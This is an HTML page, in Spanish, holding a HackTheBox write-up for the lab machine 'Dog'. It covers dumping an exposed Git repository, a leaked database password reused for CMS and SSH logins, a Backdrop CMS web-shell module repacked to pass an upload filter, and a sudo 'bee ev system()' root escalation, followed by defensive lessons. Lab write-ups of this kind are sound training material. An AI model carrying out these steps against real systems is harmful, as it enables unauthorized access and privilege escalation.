@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Dog - HackTheBox | Jorge Bravo Blog</title>
+  <meta name="description" content="Explotación de un gestor de contenido Backdrop CMS con un repositorio Git expuesto, credenciales almacenadas y módulo inseguro">
+  
+  <!-- Favicon -->
+  <link rel="icon" href="../../favicon.ico" type="image/x-icon">
+  
+  <!-- CSS -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/atom-one-dark.min.css">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&family=Inter:wght@400;500;600;700&display=swap">
+  <link rel="stylesheet" href="../../css/style.css">
+  
+  <!-- Open Graph / Social Media -->
+  <meta property="og:title" content="Dog - HackTheBox | Jorge Bravo Blog">
+  <meta property="og:description" content="Explotación de un gestor de contenido Backdrop CMS con un repositorio Git expuesto, credenciales almacenadas y módulo inseguro">
+  <meta property="og:type" content="article">
+  <meta property="og:url" content="https://jorgeb02.github.io/porfolio-para-github/blog/writeups/dog.html">
+  <meta property="og:image" content="../../img/writeups/dog/dog.png">
+  
+  <!-- Scripts -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js" defer></script>
+</head>
+<body>
+  <!-- Header -->
+  <header class="site-header">
+    <div class="container">
+      <div class="header-inner">
+        <div class="logo">
+          <a href="../../index.html" class="logo-link">
+            <h1 class="site-title">Jorge Bravo</h1>
+            <span class="site-description">Ciberseguridad y más</span>
+          </a>
+        </div>
+        
+        <nav class="main-nav">
+          <button class="menu-toggle" aria-expanded="false" aria-controls="navigation">
+            <span class="sr-only">Menú</span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+          </button>
+          
+          <ul id="navigation" class="nav-menu">
+            <li class="nav-item"><a href="../../index.html" class="nav-link">Inicio</a></li>
+            <li class="nav-item"><a href="../../writeups.html" class="nav-link active">Write-ups</a></li>
+            <li class="nav-item"><a href="../../blog.html" class="nav-link">Blog</a></li>
+            <li class="nav-item"><a href="../../about.html" class="nav-link">Sobre mí</a></li>
+          </ul>
+        </nav>
+      </div>
+    </div>
+  </header>
+  
+  <!-- Reading Progress Indicator -->
+  <div class="reading-progress" id="reading-progress"></div>
+  
+  <!-- Main Content -->
+  <main class="container">
+    <article class="writeup-single">
+      <header class="writeup-header">
+        <div class="writeup-meta">
+          <span class="provider-badge provider-hackthebox">HackTheBox</span>
+          <span class="difficulty-badge difficulty-easy">Fácil</span>
+          <span class="date-badge">27 Abr, 2025</span>
+        </div>
+        
+        <h1 class="writeup-title">Dog</h1>
+        
+        <p class="writeup-description">Explotación de un gestor de contenido Backdrop CMS con un repositorio Git expuesto, credenciales almacenadas y módulo inseguro</p>
+        
+        <div class="writeup-tags">
+          <span class="tag-badge">Enumeración web</span>
+          <span class="tag-badge">Git</span>
+          <span class="tag-badge">Backdrop CMS</span>
+          <span class="tag-badge">Configuración insegura</span>
+        </div>
+      </header>
+      
+      <div class="writeup-featured-image">
+        <img src="../../img/writeups/dog/dog.png" alt="Dog - HackTheBox" class="featured-image">
+      </div>
+      
+      <div class="writeup-content">
+        <h2>Resumen</h2>
+        <p>Dog es una máquina Linux de dificultad fácil en HackTheBox que involucra la explotación de un gestor de contenido Backdrop CMS con un repositorio Git expuesto. La vulnerabilidad principal reside en credenciales almacenadas en archivos de configuración y un módulo inseguro que permite la ejecución remota de comandos. Este write-up detalla el proceso completo de comprometer la máquina, desde la enumeración inicial hasta conseguir acceso como usuario root.</p>
+
+        <h2>Fase de reconocimiento</h2>
+        <p>Como siempre, empezamos con un escaneo Nmap para identificar los servicios disponibles en la máquina:</p>
+        
+        <pre><code class="language-bash">$ nmap -sV -sS -sC -Pn 10.10.11.58
+
+Starting Nmap 7.93 ( https://nmap.org ) at 2025-04-27 13:53 CEST
+Nmap scan report for 10.10.11.58
+Host is up (0.069s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 972ad22c898ad3ed4dac00d21e8749a7 (RSA)
+|   256 277c3ceb0f26e962590f0fb138c9ae2b (ECDSA)
+|_  256 9388474c69af7216094cba771e3b3beb (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+| http-git: 
+|   10.10.11.58:80/.git/
+|     Git repository found!
+|     Repository description: Unnamed repository; edit this file 'description' to name the...
+|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
+|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+| http-robots.txt: 22 disallowed entries (15 shown)
+| /core/ /profiles/ /README.md /web.config /admin 
+| /comment/reply /filter/tips /node/add /search /user/register 
+|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
+|_http-title: Home | Dog
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.32 seconds</code></pre>
+        
+        <p>El escaneo nos revela dos puertos abiertos:</p>
+        <ul>
+          <li><strong>Puerto 22</strong>: SSH (OpenSSH 8.2p1)</li>
+          <li><strong>Puerto 80</strong>: HTTP (Apache 2.4.41)</li>
+        </ul>
+        
+        <p>Lo más interesante es que Nmap detectó un repositorio Git expuesto en la raíz del sitio web, un robot.txt con múltiples entradas, y confirma que el sitio está utilizando Backdrop CMS.</p>
+        
+        <h2>Enumeración del sitio web</h2>
+        <p>Al visitar el sitio web en el puerto 80, encontramos una página principal de una empresa llamada "Dog":</p>
+        
+        <figure>
+          <img src="../../img/writeups/dog/dog-home.png" alt="Página principal de Dog" style="max-width: 100%;">
+          <figcaption>Página principal del sitio web Dog</figcaption>
+        </figure>
+        
+        <p>En el pie de página, podemos confirmar que el sitio está desarrollado con Backdrop CMS:</p>
+        
+        <figure>
+          <img src="../../img/writeups/dog/dog-footer.png" alt="Pie de página mostrando Backdrop CMS" style="max-width: 100%;">
+          <figcaption>Pie de página mostrando que el sitio usa Backdrop CMS</figcaption>
+        </figure>
+        
+        <h2>Descubrimiento de directorios y archivos</h2>
+        <p>Para tener una mejor visión de la estructura del sitio, utilizamos dirsearch:</p>
+        
+        <pre><code class="language-bash">$ dirsearch -u http://10.10.11.58/ -x 403,400,404
+
+  _|. _ _  _  _  _ _|_    v0.4.3                                                            
+ (_||| _) (/_(_|| (_| )                                                                     
+                                                                                            
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25
+Wordlist size: 11460
+
+Output File: /home/thejb/reports/http_10.10.11.58/__25-04-27_14-03-23.txt
+
+Target: http://10.10.11.58/
+
+[14:03:23] Starting:                                                                        
+[14:03:26] 301 -  309B  - /.git  ->  http://10.10.11.58/.git/               
+[14:03:26] 200 -  604B  - /.git/                                            
+[14:03:26] 200 -  409B  - /.git/branches/
+[14:03:26] 200 -   73B  - /.git/description
+[14:03:26] 200 -   92B  - /.git/config
+[14:03:26] 200 -   95B  - /.git/COMMIT_EDITMSG
+[14:03:26] 200 -  650B  - /.git/hooks/
+[14:03:26] 200 -   23B  - /.git/HEAD                                        
+[14:03:27] 200 -  240B  - /.git/info/exclude                                
+[14:03:27] 200 -  455B  - /.git/info/                                       
+[14:03:27] 200 -  230B  - /.git/logs/HEAD
+[14:03:27] 200 -  476B  - /.git/logs/                                       
+[14:03:27] 301 -  325B  - /.git/logs/refs/heads  ->  http://10.10.11.58/.git/logs/refs/heads/
+[14:03:27] 301 -  319B  - /.git/logs/refs  ->  http://10.10.11.58/.git/logs/refs/
+[14:03:27] 200 -  230B  - /.git/logs/refs/heads/master                      
+[14:03:27] 200 -  461B  - /.git/refs/
+[14:03:27] 200 -   41B  - /.git/refs/heads/master                           
+[14:03:27] 301 -  320B  - /.git/refs/heads  ->  http://10.10.11.58/.git/refs/heads/
+[14:03:27] 200 -    2KB - /.git/objects/                                    
+[14:03:27] 301 -  319B  - /.git/refs/tags  ->  http://10.10.11.58/.git/refs/tags/
+[14:03:27] 200 -  337KB - /.git/index                                       
+[14:04:04] 301 -  309B  - /core  ->  http://10.10.11.58/core/               
+[14:04:11] 301 -  310B  - /files  ->  http://10.10.11.58/files/             
+[14:04:11] 200 -  595B  - /files/                                           
+[14:04:15] 200 -    4KB - /index.php                                        
+[14:04:18] 200 -  456B  - /layouts/                                         
+[14:04:19] 200 -    7KB - /LICENSE.txt                                      
+[14:04:23] 301 -  312B  - /modules  ->  http://10.10.11.58/modules/         
+[14:04:23] 200 -  399B  - /modules/                                         
+[14:04:33] 200 -    5KB - /README.md                                        
+[14:04:35] 200 -  528B  - /robots.txt                                       
+[14:04:36] 200 -    0B  - /settings.php                                     
+[14:04:38] 301 -  310B  - /sites  ->  http://10.10.11.58/sites/             
+[14:04:43] 301 -  311B  - /themes  ->  http://10.10.11.58/themes/           
+                                                                             
+Task Completed</code></pre>
+        
+        <p>Confirmamos que hay un repositorio Git expuesto (.git/) que parece contener el código fuente completo del sitio.</p>
+        
+        <h2>Explotación del repositorio Git</h2>
+        <p>Para extraer la información del repositorio Git, utilizamos GitHack:</p>
+        <pre><code class="language-bash">python3 GitHack.py http://10.10.11.58/.git</code></pre>
+        <p>Esta herramienta descarga y reconstruye los archivos del repositorio Git, permitiéndonos acceder al código fuente del sitio.</p>
+        <p>Se puede descargar desde <a href="https://github.com/lijiejie/GitHack" target="_blank">https://github.com/lijiejie/GitHack</a></p>
+        
+        <h2>Descubrimiento de credenciales</h2>
+        <p>Tras examinar los archivos descargados, encontramos información sensible en el archivo settings.php:</p>
+        
+        <pre><code class="language-php">$ cat settings.php
+ 
+/**
+ * @file
+ * Main Backdrop CMS configuration file.
+ */
+
+/**
+ * Database configuration:
+ *
+ * Most sites can configure their database by entering the connection string
+ * below. If using primary/replica databases or multiple connections, see the
+ * advanced database documentation at
+ * https://api.backdropcms.org/database-configuration
+ */
+$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
+$database_prefix = '';</code></pre>
+        
+        <p>En este archivo, encontramos las credenciales de acceso a la base de datos MySQL:</p>
+        <ul>
+          <li><strong>Usuario</strong>: root</li>
+          <li><strong>Contraseña</strong>: BackDropJ2024DS2024</li>
+          <li><strong>Base de datos</strong>: backdrop</li>
+        </ul>
+        
+        <h2>Búsqueda de usuarios</h2>
+        <p>En la sección "About" del sitio web, encontramos el correo electrónico support@dog.htb, lo que nos da una pista sobre el formato de correo utilizado en la organización.</p>
+        
+        <figure>
+          <img src="../../img/writeups/dog/dog-about.png" alt="Sección About de Dog" style="max-width: 100%;">
+          <figcaption>Sección About mostrando el email de soporte</figcaption>
+        </figure>
+        
+        <p>Utilizando grep para buscar en los archivos descargados:</p>
+        
+        <pre><code class="language-bash">$ grep -r dog.htb
+
+grep: .cache/mozilla/firefox/exwbagku.default-esr/cache2/entries/577749C44CC46FB9771E35C7694B6B9FB0912A0A: coincidencia en fichero binario
+grep: .cache/mozilla/firefox/exwbagku.default-esr/cache2/entries/9968A46905223F42B7B6CC73B61FB439EA2DF175: coincidencia en fichero binario
+grep: .cache/mozilla/firefox/exwbagku.default-esr/cache2/entries/EBE75672D309C0EE96E968B0EA721D1D68B27CBB: coincidencia en fichero binario
+GitHack/10.10.11.58/files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:        "tiffany@dog.htb"
+grep: .mozilla/firefox/exwbagku.default-esr/formhistory.sqlite: coincidencia en fichero binario</code></pre>
+        
+        <p>Descubrimos el correo electrónico tiffany@dog.htb, que podría ser un usuario del sistema.</p>
+        
+        <h2>Acceso al panel de administración</h2>
+        <p>Con la información recopilada, intentamos acceder al panel de administración del CMS en /user/login utilizando:</p>
+        <ul>
+          <li><strong>Email</strong>: tiffany@dog.htb</li>
+          <li><strong>Contraseña</strong>: BackDropJ2024DS2024</li>
+        </ul>
+        
+        <p>¡Acceso concedido! Estamos dentro del panel de administración de Backdrop CMS</p>
+        
+        <figure>
+          <img src="../../img/writeups/dog/dog-admin.png" alt="Panel de administración de Backdrop CMS" style="max-width: 100%;">
+          <figcaption>Panel de administración de Backdrop CMS</figcaption>
+        </figure>
+        
+        <p>En el panel, podemos ver que la versión de Backdrop CMS es 1.27.1.</p>
+        
+        <h2>Búsqueda de vulnerabilidades</h2>
+        <p>Con la información de la versión del CMS, buscamos vulnerabilidades conocidas en Exploit Database y encontramos un exploit para ejecución remota de comandos en Backdrop CMS 1.27.1:</p>
+        
+        <figure>
+          <img src="../../img/writeups/dog/dog-exploit-db.png" alt="Exploit en Exploit-DB" style="max-width: 100%;">
+          <figcaption>Exploit para Backdrop CMS 1.27.1 en Exploit-DB</figcaption>
+        </figure>
+        
+        <p>Descargamos y ejecutamos el exploit:</p>
+        
+        <pre><code class="language-bash">$ python3 52021.py http://10.10.11.58
+
+Backdrop CMS 1.27.1 - Remote Command Execution Exploit
+Evil module generating...
+Evil module generated! shell.zip
+Go to http://10.10.11.58/admin/modules/install and upload the shell.zip for Manual Installation.
+Your shell address: http://10.10.11.58/modules/shell/shell.php</code></pre>
+        
+        <p>Sin embargo, al intentar subir el archivo shell.zip, notamos que el sistema solo permite archivos con extensiones .tar, .tgz, .gz y .bz2:</p>
+        
+        <figure>
+          <img src="../../img/writeups/dog/dog-upload-error.png" alt="Error al subir shell.zip" style="max-width: 100%;">
+          <figcaption>Error al intentar subir un archivo con extensión no permitida</figcaption>
+        </figure>
+        
+        <h2>Adaptación del exploit</h2>
+        <p>Para eludir esta restricción, empaquetamos nuestro módulo malicioso en un archivo .tar:</p>
+        
+        <pre><code class="language-bash">$ tar -cvf shell.tar shell/
+
+shell/
+shell/shell.php
+shell/shell.info</code></pre>
+        
+        <p>Ahora podemos subir nuestro módulo malicioso en /admin/installer/manual:</p>
+        
+        <figure>
+          <img src="../../img/writeups/dog/dog-upload-success.png" alt="Módulo subido con éxito" style="max-width: 100%;">
+          <figcaption>Módulo malicioso subido con éxito</figcaption>
+        </figure>
+        
+        <p>Una vez instalado, accedemos a nuestro shell en http://10.10.11.58/modules/shell/shell.php</p>
+        
+        <h2>Acceso al sistema</h2>
+        <p>Después de enumerar el sistema a través del shell web, descubrimos usuarios potenciales:</p>
+        <pre><code class="language-bash">cat /etc/passwd | grep /home</code></pre>
+        
+        <figure>
+          <img src="../../img/writeups/dog/dog-users.png" alt="Lista de usuarios del sistema" style="max-width: 100%;">
+          <figcaption>Usuarios encontrados en el sistema</figcaption>
+        </figure>
+        
+        <p>Encontramos dos usuarios interesantes:</p>
+        <ul>
+          <li>johncusack</li>
+          <li>jobert</li>
+        </ul>
+        
+        <p>Probamos acceder por SSH utilizando las credenciales previamente encontradas:</p>
+        <pre><code class="language-bash">ssh johncusack@10.10.11.58</code></pre>
+        <p>Con la contraseña BackDropJ2024DS2024 (reutilizada de la base de datos), ¡conseguimos acceso SSH!</p>
+        
+        <h2>Primera flag</h2>
+        <p>Ahora podemos obtener la primera flag:</p>
+        <pre><code class="language-bash">cat /home/johncusack/user.txt</code></pre>
+        
+        <h2>Escalada de privilegios</h2>
+        <p>Para escalar privilegios, primero comprobamos qué permisos tiene nuestro usuario:</p>
+        
+        <pre><code class="language-bash">$ sudo -l
+
+Matching Defaults entries for johncusack on dog:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User johncusack may run the following commands on dog:
+    (ALL : ALL) /usr/local/bin/bee</code></pre>
+        
+        <p>Descubrimos que podemos ejecutar el comando bee con permisos de root. Investigando, encontramos que bee es una herramienta de línea de comandos para Backdrop CMS que permite ejecutar código PHP.</p>
+        
+        <h2>Explotación del binario bee</h2>
+        <p>Podemos usar esta herramienta para ejecutar comandos como root mediante la función system() de PHP:</p>
+        
+        <pre><code class="language-bash">$ cd /var/www/html/
+$ sudo /usr/local/bin/bee ev "system('cat /root/root.txt')"</code></pre>
+        
+        <p>Con este comando, conseguimos leer el contenido de /root/root.txt y obtenemos la flag de root.</p>
+        
+        <h2>Flags</h2>
+        <ul>
+          <li><strong>User Flag</strong>: Ubicada en /home/johncusack/user.txt</li>
+          <li><strong>Root Flag</strong>: Ubicada en /root/root.txt</li>
+        </ul>
+        
+        <h2>Lecciones aprendidas</h2>
+        <ol>
+          <li><strong>Seguridad del control de versiones</strong>: Nunca dejar repositorios Git expuestos en servidores web de producción.</li>
+          <li><strong>Gestión de credenciales</strong>: Evitar almacenar contraseñas en texto plano y reutilizar credenciales.</li>
+          <li><strong>Permisos sudo</strong>: Revisar cuidadosamente qué binarios pueden ejecutar los usuarios con privilegios elevados.</li>
+          <li><strong>Actualizaciones del CMS</strong>: Mantener los sistemas CMS actualizados para evitar vulnerabilidades conocidas.</li>
+          <li><strong>Validación de entrada</strong>: Implementar filtros robustos para la carga de archivos en aplicaciones web.</li>
+        </ol>
+        
+        <h2>Herramientas utilizadas</h2>
+        <ul>
+          <li>nmap</li>
+          <li>dirsearch</li>
+          <li>GitHack</li>
+          <li>SSH</li>
+          <li>exploit para Backdrop CMS 1.27.1</li>
+        </ul>
+        
+        <h2>Conclusión</h2>
+        <p>Dog es una máquina que demuestra varios fallos de seguridad comunes en entornos web, como la exposición de información sensible en repositorios Git, la reutilización de credenciales y la configuración incorrecta de permisos. Estos errores, aunque básicos, son sorprendentemente comunes en entornos reales, lo que hace de Dog una máquina educativa para entender la importancia de las prácticas de seguridad fundamentales en el desarrollo y despliegue de aplicaciones web.</p>
+      </div>
+      
+      <nav class="post-navigation">
+        <a href="../../writeups.html" class="prev-post">
+          <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <line x1="19" y1="12" x2="5" y2="12"></line>
+            <polyline points="12 19 5 12 12 5"></polyline>
+          </svg>
+          Volver a todos los write-ups
+        </a>
+      </nav>
+    </article>
+  </main>
+  
+  <!-- Footer -->
+  <footer class="site-footer">
+    <div class="container">
+      <div class="footer-inner">
+        <div class="footer-info">
+          <p class="copyright">&copy; <span id="current-year">2025</span> Jorge Bravo González. Todos los derechos reservados.</p>
+        </div>
+        
+        <div class="footer-links">
+          <ul class="social-links">
+            <li><a href="https://www.linkedin.com/in/jorge-bravo-gonz%C3%A1lez/" target="_blank" rel="noopener" class="social-link linkedin">LinkedIn</a></li>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </footer>
+  
+  <!-- Scripts -->
+  <script src="../../js/main.js"></script>
+  <script>
+    // Actualizar año actual en el copyright
+    document.getElementById('current-year').textContent = new Date().getFullYear();
+    
+    // Inicializar resaltado de código si hay bloques de código en la página
+    document.addEventListener('DOMContentLoaded', () => {
+      if (typeof hljs !== 'undefined') {
+        document.querySelectorAll('pre code').forEach((block) => {
+          hljs.highlightElement(block);
+        });
+      }
+      
+      // Barra de progreso de lectura
+      const progressBar = document.getElementById('reading-progress');
+      if (progressBar) {
+        window.addEventListener('scroll', () => {
+          const winScroll = document.body.scrollTop || document.documentElement.scrollTop;
+          const height = document.documentElement.scrollHeight - document.documentElement.clientHeight;
+          const scrolled = (winScroll / height) * 100;
+          progressBar.style.width = scrolled + '%';
+        });
+      }
+    });
+  </script>
